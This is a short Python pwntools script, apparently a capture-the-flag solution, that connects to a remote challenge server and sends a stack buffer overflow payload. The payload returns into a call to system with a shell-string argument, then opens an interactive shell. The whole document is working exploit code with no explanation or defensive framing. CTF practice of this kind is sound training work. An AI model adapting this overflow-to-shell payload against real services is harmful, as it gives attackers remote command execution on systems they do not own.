from pwn import *
from LibcSearcher import *
#context.terminal=['tmux','splitw','-h']
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.buuoj.cn',25658)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive


call_system=0x08048529

sh=0x0804866F+1


s(b'a'*(0x18+4)+p32(call_system)+p32(sh))



ii()
